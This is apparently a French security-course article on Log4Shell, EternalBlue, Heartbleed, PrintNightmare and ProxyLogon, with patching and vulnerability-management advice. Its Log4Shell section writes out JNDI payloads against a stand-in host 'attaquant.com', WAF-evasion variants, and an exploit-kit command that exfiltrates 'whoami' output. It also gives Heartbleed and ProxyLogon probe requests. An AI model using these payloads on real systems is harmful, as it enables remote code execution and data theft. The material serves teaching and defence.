# Log4Shell et vulnérabilités critiques : les failles qui ont changé l'internet

Certaines vulnérabilités sont si graves qu'elles redéfinissent la façon dont l'industrie pense la sécurité. Log4Shell, Heartbleed, EternalBlue — ces failles ont eu des impacts mondiaux. Comprendre leur fonctionnement est essentiel pour tout professionnel de la sécurité.

## Log4Shell (CVE-2021-44228) — La pire vulnérabilité de la décennie

### Qu'est-ce que Log4j ?

Log4j est une bibliothèque de journalisation Java utilisée dans des **milliards d'applications** : Minecraft, iCloud, Steam, Twitter, Amazon AWS, Cloudflare...

### Le mécanisme de la vulnérabilité

Log4j interprète des expressions spéciales dans les messages qu'il journalise via la fonctionnalité **JNDI (Java Naming and Directory Interface)** :

```java
// Comportement NORMAL de Log4j
logger.info("Utilisateur connecté : {}", username);
// Si username = "Jean" → log : "Utilisateur connecté : Jean"

// COMPORTEMENT MALVEILLANT
// Si username = "${jndi:ldap://attaquant.com/exploit}"
logger.info("Utilisateur connecté : {}", username);
// Log4j interprète ${jndi:...} et fait une requête LDAP externe !
// → Télécharge et EXÉCUTE le code depuis attaquant.com
```

### Exploitation complète

```bash
# Payload Log4Shell basique
${jndi:ldap://attaquant.com:1389/exploit}

# Variations pour contourner les WAF
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attaquant.com/exploit}
${jndi:${lower:l}${lower:d}a${lower:p}://attaquant.com/exploit}
${${upper:j}ndi:ldap://attaquant.com/exploit}

# Exemple d'exploitation complète
# 1. Attaquant lance un serveur LDAP malveillant
python3 -m http.server 8888 &
java -jar JNDI-Exploit-Kit.jar -C "curl http://attaquant.com/$(whoami)" -A 0.0.0.0

# 2. Attaquant envoie le payload dans n'importe quel champ loggé
curl -H 'X-Api-Version: ${jndi:ldap://attaquant.com:1389/exploit}' http://victime.com/api

# 3. Le serveur vulnérable fait une requête LDAP → télécharge le payload → EXÉCUTION RCE !
```

### Vecteurs d'injection

```
N'IMPORTE QUEL champ journalisé est vulnérable :
→ User-Agent HTTP
→ X-Forwarded-For header
→ Paramètres de formulaire
→ Noms d'utilisateurs
→ Messages de chat (Minecraft !)
→ Données de fichiers uploadés
→ Paramètres URL
```

### Impact et correction

```bash
# Vérifier si vous êtes vulnérable
# Scanner avec log4shell-scanner
python3 log4shell_scanner.py -u https://votre-site.com

# Mitigation immédiate (sans mise à jour)
# Java 8u191+ : -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
# Java 11.0.1+ : JNDI désactivé par défaut

# Solution définitive : mettre à jour Log4j
# Version vulnérable : Log4j 2.0-beta9 à 2.14.1
# Version corrigée   : Log4j 2.17.1+

# Maven - mise à jour
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>  <!-- Version corrigée -->
</dependency>

# Gradle
implementation 'org.apache.logging.log4j:log4j-core:2.17.1'
```

## EternalBlue (MS17-010) — La faille NSA qui a détruit des hôpitaux

### Contexte

EternalBlue est un exploit développé par la **NSA** puis volé et publié par Shadow Brokers en 2017. Il exploite une vulnérabilité dans le protocole SMBv1 de Windows.

### Fonctionnement

```python
# EternalBlue exploite un buffer overflow dans SMBv1
# Le service SMB (port 445) est vulnérable sur Windows XP à Server 2008 R2

# Mécanisme simplifié :
# 1. Envoi d'un paquet SMB malformé → Buffer overflow
# 2. Exécution de code arbitraire en mode SYSTEM
# 3. Pas d'authentification requise !

# Impact :
# WannaCry (mai 2017) : 200 000 machines dans 150 pays en 72h
# → NHS (hôpitaux UK) : opérations annulées, patients redirigés
# → Renault, Deutsche Bahn, Telefonica paralysés

# NotPetya (juin 2017) : 10 milliards de dégâts
# → Maersk (shipping) : 45 000 PCs réinstallés
# → Merck : 870M$ de pertes
# → FedEx TNT : 400M$ de pertes
```

### Détection et protection

```powershell
# Vérifier si SMBv1 est activé
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Désactiver SMBv1 IMMÉDIATEMENT si présent
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
Set-SmbServerConfiguration –EnableSMB1Protocol $false -Force

# Appliquer MS17-010 si pas encore fait
# https://technet.microsoft.com/security/bulletin/ms17-010

# Bloquer SMB externe au niveau firewall
# Port 445 ne doit JAMAIS être exposé sur Internet
iptables -A INPUT -p tcp --dport 445 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 445 -j DROP
```

## Heartbleed (CVE-2014-0160)

### Le bug qui a "saigné" Internet

Heartbleed est une vulnérabilité dans **OpenSSL** permettant de lire la mémoire d'un serveur HTTPS — incluant potentiellement les clés privées SSL.

```python
# Fonctionnement de Heartbleed
# Le protocole TLS Heartbeat maintient les connexions actives :
# Client envoie : "Envoie-moi 'BIRD' (4 lettres)"
# Serveur répond : "BIRD" ← Normal

# Avec Heartbleed (pas de vérification de la longueur) :
# Client envoie : "Envoie-moi 'EGG' (64000 lettres)"
# Serveur répond : "EGG" + 63997 octets de mémoire
# Ces 63997 octets peuvent contenir : clés privées, mots de passe, données sensibles !

# Test de vulnérabilité
import socket, ssl

def test_heartbleed(host, port=443):
    # Paquet Heartbleed malformé
    heartbleed_payload = (
        b'\x18\x03\x02\x00\x03'  # TLS Record Header
        b'\x01'                   # Heartbeat Request
        b'\x40\x00'               # Longueur déclarée : 16384 (mais payload = 0)
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    # ... (envoi et analyse de la réponse)
    return "VULNÉRABLE" if len(response) > 3 else "Corrigé"
```

## PrintNightmare (CVE-2021-1675)

```powershell
# Vulnérabilité dans le spouleur d'impression Windows
# Permet une élévation de privilèges SYSTEM depuis un compte normal
# OU une exécution de code à distance

# Vérifier si le spouleur est en cours d'exécution
Get-Service -Name Spooler

# Mitigation si le spouleur n'est pas nécessaire
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled

# Ou limiter via GPO : Computer Configuration → Administrative Templates
# → Printers → Allow Print Spooler to accept client connections → DISABLED
```

## ProxyLogon/ProxyShell (Exchange) — CVE-2021-26855

```bash
# Chaîne de vulnérabilités dans Microsoft Exchange
# ProxyLogon : contournement d'authentification + RCE
# Exploité par Hafnium (APT chinois) AVANT le patch public

# Test de vulnérabilité
curl -k "https://exchange.victime.com/ecp/y.js" \
  -H "Cookie: X-BEResource=localhost~1942062522" \
  -H "X-AnonResource: true" \
  -H "X-BEResource: localhost/ecp/StartPage.aspx?~1942062522"
# Réponse 200 = potentiellement vulnérable

# Les patches sont disponibles depuis mars 2021
# Vérifier : Get-ExchangeServer | Select Name, AdminDisplayVersion
```

## Le CVSS — Scorer les vulnérabilités

```python
# Common Vulnerability Scoring System v3.1
# Score de 0 à 10

def calculer_cvss_basique(
    attack_vector,      # N=Network, A=Adjacent, L=Local, P=Physical
    attack_complexity,  # L=Low, H=High
    privileges_required, # N=None, L=Low, H=High
    user_interaction,   # N=None, R=Required
    scope,              # U=Unchanged, C=Changed
    confidentiality,    # N=None, L=Low, H=High
    integrity,          # N=None, L=Low, H=High
    availability        # N=None, L=Low, H=High
):
    # La formule réelle est complexe, voici les scores indicatifs
    scores = {
        'Log4Shell':       {'score': 10.0, 'severity': 'CRITIQUE'},
        'EternalBlue':     {'score': 9.8,  'severity': 'CRITIQUE'},
        'Heartbleed':      {'score': 7.5,  'severity': 'ÉLEVÉ'},
        'PrintNightmare':  {'score': 8.8,  'severity': 'ÉLEVÉ'},
        'ProxyLogon':      {'score': 9.8,  'severity': 'CRITIQUE'},
    }
    return scores

# Sources pour suivre les CVE :
# → https://nvd.nist.gov (National Vulnerability Database)
# → https://cve.mitre.org
# → https://www.exploit-db.com
# → https://vulhub.org (environnements Docker vulnérables pour s'entraîner)
```

## Bonnes pratiques de gestion des vulnérabilités

```
Programme de Vulnerability Management :

1. INVENTAIRE
   → Cartographier tous les actifs (serveurs, endpoints, applications)
   → Outils : Nessus, OpenVAS, Qualys, Tenable.io

2. SCAN RÉGULIER
   → Scan hebdomadaire des actifs critiques
   → Scan mensuel de l'ensemble du périmètre

3. PRIORISATION
   → CVSS > 9.0 : patch sous 24-48h
   → CVSS 7.0-8.9 : patch sous 7 jours
   → CVSS 4.0-6.9 : patch sous 30 jours
   → CVSS < 4.0 : planifier dans le cycle normal

4. SUIVI ET REPORTING
   → Tableau de bord du nombre de vulnérabilités par criticité
   → KPI : Mean Time to Remediate (MTTR)

5. PROGRAMME BUG BOUNTY
   → Inviter la communauté à trouver vos vulnérabilités
   → Platforms : HackerOne, Bugcrowd, YesWeHack (français)
```

## Conclusion

Log4Shell, EternalBlue, Heartbleed — ces vulnérabilités démontrent qu'une seule faille dans une bibliothèque largement utilisée peut avoir des conséquences mondiales en quelques heures. La leçon : **inventoriez vos dépendances, suivez les CVE, patchez vite**. Le délai moyen d'exploitation après publication d'un patch est passé sous les 24 heures.

---
*Article suivant : [DevSecOps : intégrer la sécurité](../articles/devsecops)*
